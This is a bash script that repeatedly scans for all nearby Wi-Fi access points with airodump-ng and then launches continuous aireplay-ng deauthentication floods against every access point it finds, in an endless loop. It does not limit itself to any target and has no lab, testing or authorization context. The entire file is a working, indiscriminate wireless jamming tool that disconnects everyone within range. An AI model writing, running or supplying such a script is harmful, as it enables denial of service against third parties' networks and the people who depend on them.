#!/bin/bash

while true; do
	echo "Scanning..."
	nohup sudo airodump-ng "$INTERFACE" -w /tmp/aps --output-format csv &
	airodump_pid=$!
	sleep 5
	sudo killall airodump-ng
	
	echo "Deauthenticating all APs"

	SCAN_CSV_FILE=$(ls -t "/tmp/aps"*.csv 2>/dev/null | head -n 1)
	
	bssids=$(grep -Eo '^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' "$SCAN_CSV_FILE" | sort -u)

	echo $bssids
	
	for bssid in $bssids; do
		echo "Starting deauth for AP: $bssid"
	        sudo aireplay-ng --deauth 0 -a "$bssid" "$INTERFACE" &
	done
	
	echo "Deauthentication attacks initiated for all found APs."
	wait
	
	sudo rm -f /tmp/aps*
done
